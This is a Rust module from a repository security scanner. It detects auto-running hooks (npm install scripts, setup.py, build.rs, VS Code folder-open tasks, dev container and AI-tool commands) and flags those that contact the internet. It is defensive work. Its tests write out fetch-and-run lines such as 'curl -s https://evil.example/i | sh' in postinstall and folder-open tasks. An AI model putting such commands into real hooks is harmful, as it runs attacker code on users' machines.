//! Finds code that runs by itself when a repository is installed or opened.
//!
//! This is how most repo attacks start: nobody has to run anything on purpose.
//! Every hook is listed. It only counts as dangerous once it contacts the
//! internet, which can't be known until all the files have been read, so
//! `finish` does that part.

use crate::git::RepoFile;
use crate::network::{CALL, URL, clean_url, host_of};
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use serde_json::Value;
use std::sync::LazyLock;

/// The npm scripts that run during `npm install`.
const NPM_INSTALL_SCRIPTS: [&str; 7] = [
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
];
const SCRIPT_EXTENSIONS: [&str; 10] = [
    ".js", ".cjs", ".mjs", ".ts", ".py", ".sh", ".ps1", ".bat", ".cmd", ".rb",
];
/// A hostile file could declare millions of these.
const MAX_HOOKS: usize = 10_000;

static RUNS_ON_FOLDER_OPEN: LazyLock<Regex> =
    LazyLock::new(|| compile(r#"(?-u)"runOn"\s*:\s*"folderOpen""#));
static COMMAND_FIELD: LazyLock<Regex> =
    LazyLock::new(|| compile(r#"(?-u)"command"\s*:\s*"((?:[^"\\\n]|\\.)*)""#));
static DEVCONTAINER_FIELD: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?-u)"(?:initializeCommand|onCreateCommand|updateContentCommand|postCreateCommand|postStartCommand|postAttachCommand)"\s*:\s*"((?:[^"\\\n]|\\.)*)""#,
    )
});

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

#[derive(Debug)]
struct Hook {
    /// What makes it run, in words.
    trigger: &'static str,
    /// The command, if there is one. Empty when a whole file runs.
    command: String,
    declared_in: Untrusted,
    line: Option<u64>,
    /// Files in the repository that this hook runs.
    runs: Vec<String>,
}

impl Hook {
    fn subject(&self) -> String {
        if self.command.is_empty() {
            self.trigger.to_string()
        } else {
            format!("{}: {}", self.trigger, self.command)
        }
    }
}

/// Every automatic hook found so far.
#[derive(Default)]
pub struct AutoRun {
    hooks: Vec<Hook>,
}

impl AutoRun {
    /// Looks for hooks in a file.
    pub fn scan(&mut self, file: &RepoFile) {
        let path = file.path.raw().replace('\\', "/");
        let lower = path.to_ascii_lowercase();
        let name = lower.rsplit('/').next().unwrap_or(&lower);
        let folder = path.rsplit_once('/').map_or("", |(folder, _)| folder);
        let is = |wanted: &str| lower == wanted || lower.ends_with(&format!("/{wanted}"));

        match name {
            "package.json" => self.scan_package_json(file, folder),
            "setup.py" => self.add_whole_file(file, "pip install runs this file", &path),
            "build.rs" => self.add_whole_file(file, "cargo build runs this file", &path),
            ".envrc" => {
                self.add_whole_file(file, "direnv runs this file on entering the folder", &path)
            }
            _ if is(".vscode/tasks.json") => self.scan_vscode_tasks(file, &path, folder),
            _ if is(".devcontainer/devcontainer.json") || is(".devcontainer.json") => {
                self.add_commands(
                    file,
                    &DEVCONTAINER_FIELD,
                    "dev container setup runs",
                    folder,
                );
            }
            _ if is(".claude/settings.json")
                || is(".mcp.json")
                || is(".cursor/mcp.json")
                || is(".vscode/mcp.json") =>
            {
                self.add_commands(file, &COMMAND_FIELD, "an AI coding tool can run", folder);
            }
            _ => {}
        }
    }

    fn push(&mut self, hook: Hook) {
        if self.hooks.len() < MAX_HOOKS {
            self.hooks.push(hook);
        }
    }

    fn add_whole_file(&mut self, file: &RepoFile, trigger: &'static str, path: &str) {
        self.push(Hook {
            trigger,
            command: String::new(),
            declared_in: file.path.clone(),
            line: None,
            runs: vec![path.to_string()],
        });
    }

    fn scan_package_json(&mut self, file: &RepoFile, folder: &str) {
        // A file npm can't parse can't run anything. The dependency check reports
        // that it couldn't be read.
        let Ok(root) = serde_json::from_slice::<Value>(&file.contents) else {
            return;
        };
        let Some(scripts) = root.get("scripts").and_then(Value::as_object) else {
            return;
        };

        for name in NPM_INSTALL_SCRIPTS {
            let Some(command) = scripts.get(name).and_then(Value::as_str) else {
                continue;
            };
            self.push(Hook {
                trigger: "npm install runs",
                command: format!("{name}: {command}"),
                declared_in: file.path.clone(),
                line: line_of(&file.contents, format!("\"{name}\"").as_bytes()),
                runs: script_paths(command, folder),
            });
        }
    }

    fn scan_vscode_tasks(&mut self, file: &RepoFile, path: &str, folder: &str) {
        if !RUNS_ON_FOLDER_OPEN.is_match(&file.contents) {
            return;
        }
        // Commands are relative to the folder holding `.vscode`.
        let workspace = folder.rsplit_once('/').map_or("", |(parent, _)| parent);
        let before = self.hooks.len();
        self.add_commands(
            file,
            &COMMAND_FIELD,
            "VS Code runs on opening the folder",
            workspace,
        );

        // Network code here may be in `args` rather than `command`, so the whole
        // file counts as running.
        match self.hooks.get_mut(before) {
            Some(first) => first.runs.push(path.to_string()),
            None => self.add_whole_file(file, "VS Code runs this on opening the folder", path),
        }
    }

    fn add_commands(
        &mut self,
        file: &RepoFile,
        field: &Regex,
        trigger: &'static str,
        folder: &str,
    ) {
        let contents = file.contents.as_slice();
        for captures in field.captures_iter(contents) {
            let (Some(whole), Some(command)) = (captures.get(0), captures.get(1)) else {
                continue;
            };
            let command = String::from_utf8_lossy(command.as_bytes()).replace("\\\"", "\"");
            self.push(Hook {
                trigger,
                runs: script_paths(&command, folder),
                command,
                declared_in: file.path.clone(),
                line: Some(line_at(contents, whole.start())),
            });
        }
    }

    /// Reports every hook, and raises the ones that contact the internet. Call
    /// this after every file has been read.
    pub fn finish(self, report: &mut Report) {
        for hook in self.hooks {
            let at = Some(At {
                path: &hook.declared_in,
                line: hook.line,
            });
            report.add(Kind::AutoRun, "", &hook.subject(), at);
            add_inline_network(&hook, at, report);

            for script in &hook.runs {
                let script_path = Untrusted::from_bytes(script.as_bytes());
                for call in report.calls_in(script) {
                    report.add(
                        Kind::AutoRunNetwork,
                        &call.group,
                        &call.subject,
                        Some(At {
                            path: &script_path,
                            line: call.line,
                        }),
                    );
                }
            }
        }
    }
}

/// Handles a hook whose own command contacts the internet.
fn add_inline_network(hook: &Hook, at: Option<At<'_>>, report: &mut Report) {
    let command = hook.command.as_bytes();
    let mut found_address = false;

    for found in URL.find_iter(command) {
        let url = clean_url(found.as_bytes());
        if let Some(host) = host_of(&url) {
            report.add(Kind::AutoRunNetwork, &host, &url, at);
            found_address = true;
        }
    }
    if !found_address && CALL.is_match(command) {
        report.add(Kind::AutoRunNetwork, "", &hook.command, at);
    }
}

fn line_at(contents: &[u8], offset: usize) -> u64 {
    contents[..offset]
        .iter()
        .filter(|byte| **byte == b'\n')
        .count() as u64
        + 1
}

fn line_of(contents: &[u8], needle: &[u8]) -> Option<u64> {
    let offset = contents
        .windows(needle.len())
        .position(|window| window == needle)?;
    Some(line_at(contents, offset))
}

/// Picks out the files a command runs, such as `scripts/setup.js` in
/// `node ./scripts/setup.js --quiet`.
fn script_paths(command: &str, folder: &str) -> Vec<String> {
    command
        .replace('\\', "/")
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '"' | '\'' | '(' | ')'))
        .filter(|token| !token.is_empty() && !token.starts_with('-') && !token.contains("://"))
        .filter(|token| {
            token.contains('/') || SCRIPT_EXTENSIONS.iter().any(|ext| token.ends_with(ext))
        })
        .filter_map(|token| resolve_relative(folder, token))
        .collect()
}

/// Works out a repository path from a command's point of view. Paths are only
/// compared with names from the archive, and never touch the filesystem.
fn resolve_relative(folder: &str, token: &str) -> Option<String> {
    let token = token.strip_prefix("${workspaceFolder}/").unwrap_or(token);
    if token.starts_with('/') || token.contains('$') {
        return None;
    }

    let mut parts: Vec<&str> = folder.split('/').filter(|part| !part.is_empty()).collect();
    for piece in token.split('/') {
        match piece {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            other => parts.push(other),
        }
    }
    Some(parts.join("/"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::report::Call;

    fn file(path: &str, contents: &str) -> RepoFile {
        RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.as_bytes().to_vec(),
        }
    }

    fn call(subject: &str) -> Call {
        Call {
            group: "evil.example".to_string(),
            subject: subject.to_string(),
            line: Some(14),
        }
    }

    fn scan_all(files: &[RepoFile], report: &mut Report) {
        let mut autorun = AutoRun::default();
        for file in files {
            autorun.scan(file);
        }
        autorun.finish(report);
    }

    fn hooks_in(path: &str, contents: &str) -> Vec<(String, u64)> {
        let mut report = Report::new();
        scan_all(&[file(path, contents)], &mut report);
        report.listed(Kind::AutoRun)
    }

    #[test]
    fn lists_npm_install_scripts_but_not_other_scripts() {
        let hooks = hooks_in(
            "package.json",
            r#"{"scripts":{
                "postinstall":"node setup.js",
                "preinstall":"echo hi",
                "test":"jest",
                "build":"curl https://a.example | sh"
            }}"#,
        );

        assert_eq!(
            hooks,
            [
                (
                    "npm install runs: postinstall: node setup.js".to_string(),
                    1
                ),
                ("npm install runs: preinstall: echo hi".to_string(), 1),
            ]
        );
    }

    #[test]
    fn a_package_json_without_scripts_or_that_cannot_be_read_has_no_hooks() {
        assert!(hooks_in("package.json", r#"{"name":"a"}"#).is_empty());
        assert!(hooks_in("package.json", "{ not json").is_empty());
    }

    #[test]
    fn finds_hooks_in_nested_folders() {
        let hooks = hooks_in(
            "packages/app/package.json",
            r#"{"scripts":{"postinstall":"node a.js"}}"#,
        );

        assert_eq!(hooks.len(), 1);
    }

    #[test]
    fn an_install_script_that_contacts_the_internet_is_dangerous() {
        let mut report = Report::new();
        scan_all(
            &[file(
                "package.json",
                r#"{"scripts":{"postinstall":"curl -s https://evil.example/i | sh"}}"#,
            )],
            &mut report,
        );

        assert_eq!(
            report.listed(Kind::AutoRunNetwork),
            [("https://evil.example/i".to_string(), 1)]
        );
        assert_eq!(
            report
                .group_of(Kind::AutoRunNetwork, "https://evil.example/i")
                .as_deref(),
            Some("evil.example")
        );
    }

    #[test]
    fn an_install_script_with_a_hidden_address_is_dangerous() {
        let mut report = Report::new();
        scan_all(
            &[file(
                "package.json",
                r#"{"scripts":{"postinstall":"curl \"$URL\" | sh"}}"#,
            )],
            &mut report,
        );

        assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1);
    }

    #[test]
    fn an_install_script_that_runs_a_file_with_network_code_is_dangerous() {
        let mut report = Report::new();
        report.record_call("app/scripts/setup.js", call("https://evil.example/x"));

        scan_all(
            &[file(
                "app/package.json",
                r#"{"scripts":{"postinstall":"node ./scripts/setup.js --quiet"}}"#,
            )],
            &mut report,
        );

        assert_eq!(
            report.listed(Kind::AutoRunNetwork),
            [("https://evil.example/x".to_string(), 1)]
        );
        assert_eq!(
            report.first_line(Kind::AutoRunNetwork, "https://evil.example/x"),
            Some(14)
        );
    }

    #[test]
    fn an_install_script_with_no_network_is_only_listed() {
        let mut report = Report::new();
        report.record_call("other.js", call("https://evil.example/x"));

        scan_all(
            &[file(
                "package.json",
                r#"{"scripts":{"prepare":"husky install && node tools/build.js"}}"#,
            )],
            &mut report,
        );

        assert_eq!(report.listed(Kind::AutoRun).len(), 1);
        assert!(report.listed(Kind::AutoRunNetwork).is_empty());
    }

    #[test]
    fn a_vscode_task_that_runs_on_opening_the_folder_is_listed() {
        let tasks = r#"{
            // VS Code allows comments here.
            "version": "2.0.0",
            "tasks": [{
                "label": "setup",
                "command": "node .vscode/run.js",
                "runOptions": { "runOn": "folderOpen" },
            }]
        }"#;

        assert_eq!(
            hooks_in(".vscode/tasks.json", tasks),
            [(
                "VS Code runs on opening the folder: node .vscode/run.js".to_string(),
                1
            )]
        );
    }

    #[test]
    fn a_vscode_task_that_only_runs_when_asked_is_not_listed() {
        let tasks = r#"{"tasks":[{"label":"build","command":"npm run build"}]}"#;

        assert!(hooks_in(".vscode/tasks.json", tasks).is_empty());
    }

    #[test]
    fn a_vscode_task_that_contacts_the_internet_is_dangerous() {
        let tasks = r#"{"tasks":[{"command":"curl https://evil.example/x | sh",
                        "runOptions":{"runOn":"folderOpen"}}]}"#;
        let mut report = Report::new();
        scan_all(&[file(".vscode/tasks.json", tasks)], &mut report);

        assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1);
    }

    #[test]
    fn a_vscode_task_is_resolved_from_the_folder_holding_vscode() {
        let tasks = r#"{"tasks":[{"command":"node scripts/run.js",
                        "runOptions":{"runOn":"folderOpen"}}]}"#;
        let mut report = Report::new();
        report.record_call("project/scripts/run.js", call("https://evil.example/x"));

        scan_all(&[file("project/.vscode/tasks.json", tasks)], &mut report);

        assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1);
    }

    #[test]
    fn network_code_anywhere_in_a_folder_open_task_file_counts() {
        let tasks = r#"{"tasks":[{"command":"bash","args":["-c","curl x.example | sh"],
                        "runOptions":{"runOn":"folderOpen"}}]}"#;
        let mut report = Report::new();
        report.record_call(".vscode/tasks.json", call("curl x.example | sh"));

        scan_all(&[file(".vscode/tasks.json", tasks)], &mut report);

        assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1);
    }

    #[test]
    fn setup_py_and_build_rs_run_as_whole_files() {
        for (path, trigger) in [
            ("setup.py", "pip install runs this file"),
            ("crates/a/build.rs", "cargo build runs this file"),
        ] {
            let mut report = Report::new();
            report.record_call(path, call("https://evil.example/x"));

            scan_all(&[file(path, "code")], &mut report);

            assert_eq!(report.listed(Kind::AutoRun), [(trigger.to_string(), 1)]);
            assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1, "{path}");
        }
    }

    #[test]
    fn finds_dev_container_and_ai_tool_commands() {
        assert_eq!(
            hooks_in(
                ".devcontainer/devcontainer.json",
                r#"{"postCreateCommand":"npm install"}"#
            ),
            [("dev container setup runs: npm install".to_string(), 1)]
        );
        for path in [
            ".mcp.json",
            ".cursor/mcp.json",
            ".vscode/mcp.json",
            ".claude/settings.json",
        ] {
            assert_eq!(
                hooks_in(path, r#"{"a":{"command":"node server.js"}}"#),
                [("an AI coding tool can run: node server.js".to_string(), 1)],
                "{path}"
            );
        }
    }

    #[test]
    fn paths_match_whatever_their_case() {
        assert_eq!(
            hooks_in("PACKAGE.JSON", r#"{"scripts":{"install":"x"}}"#).len(),
            1
        );
        assert_eq!(hooks_in("SETUP.PY", "x").len(), 1);
    }

    #[test]
    fn similar_names_are_not_hooks() {
        for path in [
            "my-setup.py",
            "rebuild.rs",
            "not.vscode/tasks.json",
            "mcp.json",
        ] {
            assert!(
                hooks_in(path, r#"{"command":"x","runOn":"folderOpen"}"#).is_empty(),
                "{path}"
            );
        }
    }

    #[test]
    fn works_out_which_files_a_command_runs() {
        for (command, folder, expected) in [
            ("node setup.js", "", vec!["setup.js"]),
            ("node ./scripts/a.js --x", "", vec!["scripts/a.js"]),
            ("node ../tools/a.js", "app/web", vec!["app/tools/a.js"]),
            ("sh a.sh && python b.py", "x", vec!["x/a.sh", "x/b.py"]),
            ("node .vscode\\run.js", "", vec![".vscode/run.js"]),
            ("node ${workspaceFolder}/a.js", "", vec!["a.js"]),
            ("husky install", "", vec![]),
            ("curl https://a.example/x.js", "", vec![]),
            ("node /etc/a.js", "", vec![]),
            ("node ../../../a.js", "x", vec![]),
        ] {
            assert_eq!(
                script_paths(command, folder),
                expected,
                "command: {command}"
            );
        }
    }

    #[test]
    fn reports_where_a_hook_is_declared() {
        let mut report = Report::new();
        let contents = "{\n  \"scripts\": {\n    \"postinstall\": \"node a.js\"\n  }\n}";
        scan_all(&[file("package.json", contents)], &mut report);

        assert_eq!(
            report.first_line(Kind::AutoRun, "npm install runs: postinstall: node a.js"),
            Some(3)
        );
    }
}
